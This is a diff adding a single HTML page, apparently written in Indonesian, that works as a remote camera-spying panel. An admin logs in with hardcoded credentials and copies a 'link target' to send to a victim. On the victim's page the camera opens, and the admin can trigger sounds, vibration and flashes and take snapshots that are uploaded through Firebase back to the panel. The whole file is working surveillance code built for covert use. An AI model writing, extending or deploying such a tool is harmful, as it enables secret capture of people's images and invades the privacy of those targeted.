@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>👑 PANEL ADMIN REALTIME</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<!-- FIREBASE -->
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif;}
+body{background:#050505;color:white;padding:10px;}
+
+/* LOGIN */
+#loginBox{
+display:flex;height:100vh;justify-content:center;align-items:center;flex-direction:column;
+}
+#loginBox input{padding:10px;margin:5px;background:#000;color:#0f0;border:1px solid #0f0;}
+#loginBox button{padding:10px;background:#0f0;border:none;font-weight:bold;}
+
+/* PANEL */
+.container{
+max-width:500px;margin:auto;border:2px solid #444;border-radius:15px;overflow:hidden;background:#111;
+}
+.header{
+background:linear-gradient(90deg,#ff0000,#8b0000);
+padding:15px;text-align:center;font-size:20px;font-weight:bold;text-shadow:0 0 10px red;
+}
+.status{
+background:#1a1a1a;padding:10px;text-align:center;font-size:14px;color:#0f0;border-bottom:1px solid #333;
+}
+
+.controls{
+display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;padding:15px;
+}
+.btn{
+padding:15px;border:none;border-radius:10px;font-weight:bold;
+}
+.btn1{background:#e63946;}
+.btn2{background:#00b894;}
+.btn3{background:#fd79a8;}
+.btn4{background:#ffbe0b;}
+.btn5{background:#3a86ff;}
+.btn6{background:#e17055;}
+
+.link-area{background:#000;padding:20px;border-top:2px solid red;}
+#linkBox{
+padding:10px;border:2px solid #0f0;color:#0f0;text-align:center;border-radius:8px;word-break:break-all;
+}
+
+/* TARGET */
+#modeTarget{display:none;text-align:center;}
+video{width:100%;max-width:300px;border:2px solid #0f0;}
+</style>
+</head>
+
+<body>
+
+<!-- LOGIN -->
+<div id="loginBox">
+<h2>LOGIN ADMIN</h2>
+<input id="user" placeholder="Username">
+<input id="pass" type="password" placeholder="Password">
+<button onclick="login()">MASUK</button>
+<p id="loginError"></p>
+</div>
+
+<!-- ADMIN -->
+<div class="container" id="modeAdmin" style="display:none;">
+<div class="header">👑 PANEL ADMIN 👑</div>
+<div class="status">🟢 REALTIME AKTIF</div>
+
+<div class="controls">
+<button class="btn btn2" onclick="kirim('sound')">🔊 SUARA</button>
+<button class="btn btn3" onclick="kirim('vibrate')">📳 GETAR</button>
+<button class="btn btn4" onclick="kirim('flash')">💡 FLASH</button>
+<button class="btn btn1" onclick="kirim('photo')">📸 FOTO</button>
+<button class="btn btn5" onclick="kirim('wall')">🌆 WALL</button>
+</div>
+
+<h3 style="text-align:center;">📸 HASIL FOTO</h3>
+<img id="hasil" style="width:100%;max-width:200px;display:block;margin:auto;">
+
+<div class="link-area">
+<h3>🔗 LINK TARGET</h3>
+<div id="linkBox"></div>
+<button onclick="copyLink()">COPY LINK</button>
+</div>
+</div>
+
+<!-- TARGET -->
+<div id="modeTarget">
+<h2 style="color:#0f0;">MODE TARGET</h2>
+<video id="video" autoplay playsinline></video>
+
+<audio id="audio">
+<source src="https://assets.mixkit.co/sfx/preview/mixkit-alarm-digital-clock-beep-989.mp3">
+</audio>
+</div>
+
+<script>
+
+// LOGIN
+function login(){
+let u=user.value;
+let p=pass.value;
+
+if(u==="Admin" && p==="1122"){
+loginBox.style.display="none";
+modeAdmin.style.display="block";
+buatLink();
+}else{
+loginError.innerText="❌ SALAH";
+}
+}
+
+// LINK
+function buatLink(){
+let base=location.origin+location.pathname;
+linkBox.innerText=base+"?view=target";
+}
+function copyLink(){
+navigator.clipboard.writeText(linkBox.innerText);
+alert("Link disalin");
+}
+
+// MODE
+let param=new URLSearchParams(location.search);
+if(param.get("view")==="target"){
+loginBox.style.display="none";
+modeTarget.style.display="block";
+}
+
+// 🔥 FIREBASE CONFIG (ISI PUNYAMU)
+const firebaseConfig={
+apiKey:"ISI",
+authDomain:"ISI",
+databaseURL:"ISI",
+projectId:"ISI",
+storageBucket:"ISI",
+messagingSenderId:"ISI",
+appId:"ISI"
+};
+
+firebase.initializeApp(firebaseConfig);
+const db=firebase.database();
+
+// ADMIN KIRIM
+function kirim(cmd){
+db.ref("control").set({cmd:cmd,time:Date.now()});
+}
+
+// TARGET START
+let stream=null;
+
+if(param.get("view")==="target"){
+navigator.mediaDevices.getUserMedia({video:true})
+.then(s=>{
+stream=s;
+video.srcObject=s;
+});
+
+db.ref("control").on("value",snap=>{
+let d=snap.val();
+if(!d) return;
+
+switch(d.cmd){
+
+case "sound":
+audio.play();
+break;
+
+case "vibrate":
+if(navigator.vibrate) navigator.vibrate([300,100,300]);
+break;
+
+case "flash":
+document.body.style.background="white";
+setTimeout(()=>document.body.style.background="#000",200);
+break;
+
+case "photo":
+ambilFoto();
+break;
+
+case "wall":
+document.body.style.background="linear-gradient(45deg,#000,#222)";
+break;
+
+}
+});
+}
+
+// FOTO
+function ambilFoto(){
+if(!stream) return;
+
+let canvas=document.createElement("canvas");
+canvas.width=video.videoWidth;
+canvas.height=video.videoHeight;
+canvas.getContext("2d").drawImage(video,0,0);
+
+let img=canvas.toDataURL();
+db.ref("photo").set(img);
+}
+
+// ADMIN TERIMA FOTO
+db.ref("photo").on("value",snap=>{
+if(snap.val()){
+hasil.src=snap.val();
+}
+});
+
+</script>
+
+</body>
+</html>
